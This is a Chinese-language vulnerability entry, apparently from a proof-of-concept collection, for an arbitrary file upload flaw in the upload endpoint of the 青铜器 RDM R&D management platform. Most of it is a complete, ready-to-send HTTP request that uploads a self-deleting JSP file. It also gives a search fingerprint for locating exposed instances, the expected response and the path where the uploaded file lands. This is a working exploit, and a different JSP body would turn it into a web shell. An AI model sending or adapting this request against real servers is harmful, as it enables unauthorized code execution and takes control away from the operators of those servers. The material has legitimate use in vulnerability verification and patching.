﻿# 青铜器RDM研发管理平台 upload 任意文件上传漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：青铜器RDM研发管理平台 upload接口处存在任意文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

> 漏洞特征：body="/images/rdm.ico"

> 验证脚本：HTTP

```
POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1
Content-Type: multipart/form-data; boundary=98hgfhfbuefbhbvuyh98
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--98hgfhfbuefbhbvuyh98
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream

<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--98hgfhfbuefbhbvuyh98
Content-Disposition: form-data; name="Submit"

Go
--98hgfhfbuefbhbvuyh98--
```

> 响应代码特征：200

> 响应内容特征：.jsp

> 上传文件定位：/repository/000000000/demo.jsp

> 验证文件来源：青铜器RDM研发管理平台 upload 任意文件上传漏洞.poc

